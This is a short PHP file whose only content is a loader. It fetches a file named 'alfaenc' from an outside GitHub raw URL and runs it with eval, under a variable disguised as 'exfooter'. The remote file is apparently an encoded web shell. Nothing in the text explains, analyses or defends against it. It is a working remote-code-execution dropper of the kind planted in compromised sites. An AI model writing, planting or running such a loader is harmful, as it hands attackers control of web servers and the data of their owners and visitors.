<?php
$url = 'https://raw.githubusercontent.com/tuamuda303/by1/main/alfaenc';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>